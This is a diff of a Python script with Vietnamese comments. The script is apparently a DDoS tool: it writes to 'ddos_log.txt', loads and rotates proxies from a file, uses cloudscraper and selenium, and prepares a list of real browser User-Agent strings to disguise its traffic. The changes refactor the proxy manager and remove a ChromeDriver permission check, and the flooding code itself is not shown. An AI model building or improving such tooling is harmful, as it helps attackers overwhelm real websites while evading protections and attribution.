@@ -11,7 +11,6 @@ import cloudscraper
 from concurrent.futures import ThreadPoolExecutor
 from requests.exceptions import RequestException, Timeout, ConnectionError
 from sklearn.ensemble import RandomForestClassifier
-from sklearn.utils.validation import check_is_fitted
 import numpy as np
 from bs4 import BeautifulSoup
 from selenium import webdriver
@@ -19,10 +18,9 @@ from selenium.webdriver.chrome.service import Service
 from webdriver_manager.chrome import ChromeDriverManager
 import psutil
 from collections import deque
-from urllib.parse import urljoin
 
 # Kiểm tra phiên bản Python
-if sys.version_info < (3, 7):
+if sys.version_info < (3, 7):  # cloudscraper và scikit-learn yêu cầu 3.7+
     print("Yêu cầu Python 3.7 trở lên.")
     sys.exit(1)
 
@@ -92,23 +90,15 @@ except PermissionError:
     print("Lỗi: Không có quyền ghi vào ddos_log.txt.")
     sys.exit(1)
 
-# Kiểm tra quyền thực thi ChromeDriver
-try:
-    chromedriver_path = ChromeDriverManager().install()
-    if not os.access(chromedriver_path, os.X_OK):
-        print("Lỗi: ChromeDriver không có quyền thực thi. Vui lòng cấp quyền.")
-        sys.exit(1)
-except Exception as e:
-    print(f"Lỗi khi cài đặt ChromeDriver: {str(e)}")
-    sys.exit(1)
-
 # Lớp quản lý proxy từ tệp proxies.txt
 class ProxyManager:
     def __init__(self, proxy_file="proxies.txt"):
-        self.proxy_file = proxy_file
         self.proxy_cache = deque()
+        self.proxy_file = proxy_file
+        self.load_proxies()
 
     def load_proxies(self):
+        """Đọc và chuẩn hóa proxy từ tệp proxies.txt."""
         try:
             if not os.path.exists(self.proxy_file):
                 print(f"Lỗi: Tệp {self.proxy_file} không tồn tại.")
@@ -118,7 +108,16 @@ class ProxyManager:
             if not proxies:
                 print(f"Lỗi: Tệp {self.proxy_file} rỗng.")
                 sys.exit(1)
-            return [f"http://{proxy.strip()}" if not proxy.strip().startswith("http") else proxy.strip() for proxy in proxies if proxy.strip()]
+            # Chuẩn hóa định dạng proxy
+            for proxy in proxies:
+                proxy = proxy.strip()
+                if proxy:
+                    if not proxy.startswith("http://"):
+                        proxy = f"http://{proxy}"
+                    self.proxy_cache.append(proxy)
+            print(f"Đã tải {len(self.proxy_cache)} proxy từ {self.proxy_file}.")
+            with open("ddos_log.txt", "a") as f:
+                f.write(f"[{time.ctime()}] Loaded {len(self.proxy_cache)} proxies from {self.proxy_file}\n")
         except PermissionError:
             print(f"Lỗi: Không có quyền đọc tệp {self.proxy_file}.")
             sys.exit(1)
@@ -126,36 +125,22 @@ class ProxyManager:
             print(f"Lỗi khi đọc tệp {self.proxy_file}: {str(e)}")
             sys.exit(1)
 
-    async def initialize(self):
-        proxies = self.load_proxies()
-        valid_proxies = []
-        print("Đang kiểm tra proxy hoạt động...")
-        for proxy in proxies:
-            if await self.test_proxy({"http": proxy, "https": proxy}):
-                valid_proxies.append(proxy)
-        self.proxy_cache = deque(valid_proxies)
-        print(f"Đã lọc, còn {len(self.proxy_cache)} proxy hoạt động.")
-        with open("ddos_log.txt", "a") as f:
-            f.write(f"[{time.ctime()}] Loaded and filtered {len(self.proxy_cache)} active proxies from {self.proxy_file}\n")
-
     async def get_proxy(self):
+        """Lấy một proxy ngẫu nhiên từ cache."""
         if not self.proxy_cache:
-            print("Hết proxy, tải lại...")
-            await self.initialize()
-            if not self.proxy_cache:
-                print("Không thể tải proxy hoạt động. Dừng chương trình.")
-                sys.exit(1)
+            print("Lỗi: Hết proxy trong danh sách.")
+            return None
         proxy = random.choice(self.proxy_cache)
         return {"http": proxy, "https": proxy}
 
     async def test_proxy(self, proxy):
+        """Kiểm tra proxy có hoạt động không."""
         try:
             async with aiohttp.ClientSession() as session:
                 async with session.get("http://httpbin.org/ip", proxy=proxy["http"], timeout=3) as response:
                     return response.status == 200
         except:
             return False
-
 # Danh sách 100 User-Agent thực tế
 user_agents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
